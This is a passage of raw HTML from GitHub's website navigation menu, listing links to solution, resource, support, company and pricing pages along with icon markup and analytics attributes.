href="https://github.com/enterprise/startups" data-analytics-event="{&quot;action&quot;:&quot;startups&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;startups_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Startups</span></span></span></a></li><li><a href="https://github.com/solutions/industry/nonprofits" data-analytics-event="{&quot;action&quot;:&quot;nonprofits&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;nonprofits_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Nonprofits</span></span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_9lnd_">By Industry</span><ul class="LinkList__vQ9yLT" aria-labelledby="_R_9lnd_"><li><a href="https://github.com/solutions/industry/healthcare" data-analytics-event="{&quot;action&quot;:&quot;healthcare&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;healthcare_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Healthcare</span></span></span></a></li><li><a href="https://github.com/solutions/industry/financial-services" data-analytics-event="{&quot;action&quot;:&quot;financial_services&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;financial_services_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Financial services</span></span></span></a></li><li><a href="https://github.com/solutions/industry/manufacturing" data-analytics-event="{&quot;action&quot;:&quot;manufacturing&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;manufacturing_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Manufacturing</span></span></span></a></li><li><a href="https://github.com/solutions/industry/government" data-analytics-event="{&quot;action&quot;:&quot;government&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;government_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Government</span></span></span></a></li><li><a href="https://github.com/solutions/industry" data-analytics-event="{&quot;action&quot;:&quot;see_all_industries&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;see_all_industries_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">See all industries</span><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-chevron-right Arrow__Um9le0" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_dlnd_">Evaluate GitHub</span><ul class="LinkList__vQ9yLT" aria-labelledby="_R_dlnd_"><li><a href="https://github.com/why-github" data-analytics-event="{&quot;action&quot;:&quot;why_github&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;why_github_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Why GitHub</span></span></span></a></li><li><a href="https://github.com/customer-stories" data-analytics-event="{&quot;action&quot;:&quot;customer_stories&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;customer_stories_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Customer Stories</span></span></span></a></li><li><a href="https://github.com/solutions/executive-insights" data-analytics-event="{&quot;action&quot;:&quot;business_insights&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;business_insights_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Business insights</span></span></span></a></li><li><a href="https://github.com/trust-center" data-analytics-event="{&quot;action&quot;:&quot;trust_center&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;trust_center_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Trust Center</span></span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs separated__bzFSt-"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_hlnd_">Add-ons</span><ul class="LinkList__vQ9yLT IconList__WlH-sM" aria-labelledby="_R_hlnd_"><li><a href="https://github.com/security/advanced-security" data-analytics-event="{&quot;action&quot;:&quot;github_advanced_security&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_advanced_security_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-shield-check" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m8.533.133 5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667l5.25-1.68a1.748 1.748 0 0 1 1.066 0Zm-.61 1.429.001.001-5.25 1.68a.251.251 0 0 0-.174.237V7c0 1.36.275 2.666 1.057 3.859.784 1.194 2.121 2.342 4.366 3.298a.196.196 0 0 0 .154 0c2.245-.957 3.582-2.103 4.366-3.297C13.225 9.666 13.5 8.358 13.5 7V3.48a.25.25 0 0 0-.174-.238l-5.25-1.68a.25.25 0 0 0-.153 0ZM11.28 6.28l-3.5 3.5a.75.75 0 0 1-1.06 0l-1.5-1.5a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215l.97.97 2.97-2.97a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">GitHub Advanced Security</span></span><span class="Subtitle__DzvloX">Enterprise-grade code security</span></span></a></li><li><a href="https://github.com/features/copilot/copilot-business" data-analytics-event="{&quot;action&quot;:&quot;copilot_for_business&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;copilot_for_business_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-copilot" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M7.998 15.035c-4.562 0-7.873-2.914-7.998-3.749V9.338c.085-.628.677-1.686 1.588-2.065.013-.07.024-.143.036-.218.029-.183.06-.384.126-.612-.201-.508-.254-1.084-.254-1.656 0-.87.128-1.769.693-2.484.579-.733 1.494-1.124 2.724-1.261 1.206-.134 2.262.034 2.944.765.05.053.096.108.139.165.044-.057.094-.112.143-.165.682-.731 1.738-.899 2.944-.765 1.23.137 2.145.528 2.724 1.261.566.715.693 1.614.693 2.484 0 .572-.053 1.148-.254 1.656.066.228.098.429.126.612.012.076.024.148.037.218.924.385 1.522 1.471 1.591 2.095v1.872c0 .766-3.351 3.795-8.002 3.795Zm0-1.485c2.28 0 4.584-1.11 5.002-1.433V7.862l-.023-.116c-.49.21-1.075.291-1.727.291-1.146 0-2.059-.327-2.71-.991A3.222 3.222 0 0 1 8 6.303a3.24 3.24 0 0 1-.544.743c-.65.664-1.563.991-2.71.991-.652 0-1.236-.081-1.727-.291l-.023.116v4.255c.419.323 2.722 1.433 5.002 1.433ZM6.762 2.83c-.193-.206-.637-.413-1.682-.297-1.019.113-1.479.404-1.713.7-.247.312-.369.789-.369 1.554 0 .793.129 1.171.308 1.371.162.181.519.379 1.442.379.853 0 1.339-.235 1.638-.54.315-.322.527-.827.617-1.553.117-.935-.037-1.395-.241-1.614Zm4.155-.297c-1.044-.116-1.488.091-1.681.297-.204.219-.359.679-.242 1.614.091.726.303 1.231.618 1.553.299.305.784.54 1.638.54.922 0 1.28-.198 1.442-.379.179-.2.308-.578.308-1.371 0-.765-.123-1.242-.37-1.554-.233-.296-.693-.587-1.713-.7Z"></path><path d="M6.25 9.037a.75.75 0 0 1 .75.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 .75-.75Zm4.25.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 1.5 0Z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Copilot for business</span></span><span class="Subtitle__DzvloX">Enterprise-grade AI features</span></span></a></li><li><a href="https://github.com/enterprise/premium-support" data-analytics-event="{&quot;action&quot;:&quot;premium_support&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;businesses&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;premium_support_link_businesses_navbar&quot;}" class="Link__Q0qcrF"><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-comment-discussion" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1h8.5c.966 0 1.75.784 1.75 1.75v5.5A1.75 1.75 0 0 1 10.25 10H7.061l-2.574 2.573A1.458 1.458 0 0 1 2 11.543V10h-.25A1.75 1.75 0 0 1 0 8.25v-5.5C0 1.784.784 1 1.75 1ZM1.5 2.75v5.5c0 .138.112.25.25.25h1a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h3.5a.25.25 0 0 0 .25-.25v-5.5a.25.25 0 0 0-.25-.25h-8.5a.25.25 0 0 0-.25.25Zm13 2a.25.25 0 0 0-.25-.25h-.5a.75.75 0 0 1 0-1.5h.5c.966 0 1.75.784 1.75 1.75v5.5A1.75 1.75 0 0 1 14.25 12H14v1.543a1.458 1.458 0 0 1-2.487 1.03L9.22 12.28a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215l2.22 2.22v-2.19a.75.75 0 0 1 .75-.75h1a.25.25 0 0 0 .25-.25Z"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Premium Support</span></span><span class="Subtitle__DzvloX">Enterprise-grade 24/7 support</span></span></a></li></ul></div></li></ul></div></div></div></li><li><div class="Container__emC4mW"><button type="button" class="Button__wfsCbG" aria-expanded="false" aria-controls="_R_27d_">Resources<svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-triangle-right ButtonIcon__jioMke" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="m6.427 4.427 3.396 3.396a.25.25 0 0 1 0 .354l-3.396 3.396A.25.25 0 0 1 6 11.396V4.604a.25.25 0 0 1 .427-.177Z"></path></svg></button><div id="_R_27d_" class="Dropdown__mIjZVL"><div class="Panel__x1katk"><ul class="Groups__weN4wF"><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_5m7d_">Learn &amp; Connect</span><ul class="LinkList__vQ9yLT" aria-labelledby="_R_5m7d_"><li><a href="https://docs.github.com/en" data-analytics-event="{&quot;action&quot;:&quot;documentation&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;documentation_link_resources_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Documentation</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li><li><a href="https://github.com/resources" data-analytics-event="{&quot;action&quot;:&quot;resource_center&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;resource_center_link_resources_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Resource center</span></span></span></a></li><li><a href="https://github.blog/" data-analytics-event="{&quot;action&quot;:&quot;blog&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;blog_link_resources_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Blog</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li><li><a href="https://github.com/resources/events" data-analytics-event="{&quot;action&quot;:&quot;events__webinars&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;events__webinars_link_resources_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Events &amp; webinars</span></span></span></a></li><li><a href="https://github.com/orgs/community/discussions" data-analytics-event="{&quot;action&quot;:&quot;community_forum&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;community_forum_link_resources_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Community Forum</span></span></span></a></li><li><a href="https://github.com/customer-stories" data-analytics-event="{&quot;action&quot;:&quot;customer_stories&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;customer_stories_link_resources_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Customer Stories</span></span></span></a></li><li><a href="https://github.com/marketplace" data-analytics-event="{&quot;action&quot;:&quot;integrations&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;integrations_link_resources_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Integrations</span></span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_9m7d_">Support</span><ul class="LinkList__vQ9yLT" aria-labelledby="_R_9m7d_"><li><a href="https://help.github.com/" data-analytics-event="{&quot;action&quot;:&quot;customer_support&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;customer_support_link_resources_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Customer support</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li><li><a href="https://learn.github.com/skills" data-analytics-event="{&quot;action&quot;:&quot;training&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;training_link_resources_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Training</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li><li><a href="https://www.githubstatus.com/" data-analytics-event="{&quot;action&quot;:&quot;github_status&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_status_link_resources_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">GitHub Status</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX" id="_R_dm7d_">Company</span><ul class="LinkList__vQ9yLT" aria-labelledby="_R_dm7d_"><li><a href="https://github.com/about" data-analytics-event="{&quot;action&quot;:&quot;about&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;about_link_resources_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">About</span></span></span></a></li><li><a href="https://github.com/partners" data-analytics-event="{&quot;action&quot;:&quot;partners&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;partners_link_resources_navbar&quot;}" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Partners</span></span></span></a></li><li><a href="https://github.blog/changelog/" data-analytics-event="{&quot;action&quot;:&quot;changelog&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;changelog_link_resources_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF"><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">Changelog</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span></span></a></li></ul></div></li><li class="GroupCell__3rf5gs featured__8zdr8E"><div class="Group__brYvQ7"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--monospace___QXHDQ Primer_Brand__Text-module__Text--muted___rE6mh Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ GroupTitle__PxvdbX visually-hidden" id="_R_hm7d_">GitHub Universe</span><ul class="LinkList__vQ9yLT IconList__WlH-sM" aria-labelledby="_R_hm7d_"><li><a href="https://githubuniverse.com/" data-analytics-event="{&quot;action&quot;:&quot;github_universe&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_universe_link_resources_navbar&quot;}" target="_blank" rel="noreferrer" class="Link__Q0qcrF Card__w-iBF7"><span class="Thumbnail__vqvSAN" aria-hidden="true"><img src="https://github.githubassets.com/assets/universe-a98cd54821b27569.png" alt="" width="240" height="150" class="LightImage__i9mM_d"/><img src="https://github.githubassets.com/assets/universe-a98cd54821b27569.png" alt="" width="240" height="150" class="DarkImage__B4rswp"/></span><span class="Icon__xpGsPX"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-mark-github" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.766 11.328c-2.063-.25-3.516-1.734-3.516-3.656 0-.781.281-1.625.75-2.188-.203-.515-.172-1.609.063-2.062.625-.078 1.468.25 1.968.703.594-.187 1.219-.281 1.985-.281.765 0 1.39.094 1.953.265.484-.437 1.344-.765 1.969-.687.218.422.25 1.515.046 2.047.5.593.766 1.39.766 2.203 0 1.922-1.453 3.375-3.547 3.64.531.344.89 1.094.89 1.954v1.625c0 .468.391.734.86.547C13.781 14.359 16 11.53 16 8.03 16 3.61 12.406 0 7.984 0 3.563 0 0 3.61 0 8.031a7.88 7.88 0 0 0 5.172 7.422c.422.156.828-.125.828-.547v-1.25c-.219.094-.5.156-.75.156-1.031 0-1.64-.562-2.078-1.609-.172-.422-.36-.672-.719-.719-.187-.015-.25-.093-.25-.187 0-.188.313-.328.625-.328.453 0 .844.281 1.25.86.313.452.64.655 1.031.655s.641-.14 1-.5c.266-.265.47-.5.657-.656"></path></svg></span><span class="Copy__CMyHbK"><span class="LinkTitle__B7iBkM"><span class="LinkText__Lw-n5M">GitHub Universe</span><svg data-component="Octicon" focusable="false" aria-label="(opens in a new tab)" class="octicon octicon-arrow-up-right" role="img" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M4.53 4.75A.75.75 0 0 1 5.28 4h6.01a.75.75 0 0 1 .75.75v6.01a.75.75 0 0 1-1.5 0v-4.2l-5.26 5.261a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L9.48 5.5h-4.2a.75.75 0 0 1-.75-.75Z"></path></svg></span><span class="Subtitle__DzvloX">The event for developers, by developers — talks, workshops, and what’s next for GitHub.</span></span></a></li></ul></div></li></ul></div></div></div></li><li><a href="https://github.com/pricing" data-analytics-event="{&quot;action&quot;:&quot;pricing&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;pricing&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;pricing_link_pricing_navbar&quot;}" class="NavLink__zcO0BA">Pricing</a></li></ul></nav><div class="ctaContainer__XiXTge"><div class="searchSlot__PLyIP2"><button class="Primer_Brand__Button-module__Button___scH9Z Primer_Brand__Button-module__Button--subtle___F7pEE Primer_Brand__Button-module__Button--size-small___zQrEw trigger__A07fH5" type="button" aria-haspopup="dialog" aria-expanded="false" aria-label="Search or jump to, type / to search" data-analytics-event="{&quot;action&quot;:&quot;searchbar&quot;,&quot;tag&quot;:&quot;input&quot;,&quot;context&quot;:&quot;global&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;searchbar_input_global_navbar&quot;}"><span class="Primer_Brand__Button-module__Button__text___ED0bX"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--mona-sans___a8XJD Primer_Brand__Text-module__Text--default___GhPh_ Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ Primer_Brand__Button-module__Button--label___qrkyz Primer_Brand__Button-module__Button--label-subtle___8ndWH"><span class="content__-QV4lC"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-search icon__dKfd-T" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path></svg><span class="label__Axw9pp">Search</span><kbd class="kbd__-xAXYz" aria-hidden="true">/</kbd></span></span></span></button><div class="d-none"></div></div><div class="AuthActions__J52IGi"><div class="signInWrap___-hg2x"><a class="Primer_Brand__Button-module__Button___scH9Z Primer_Brand__Button-module__Button--subtle___F7pEE Primer_Brand__Button-module__Button--size-small___zQrEw cta__xkenoh desktopActionGap__qkQEsb hiddenBelowLg__f0ML96" 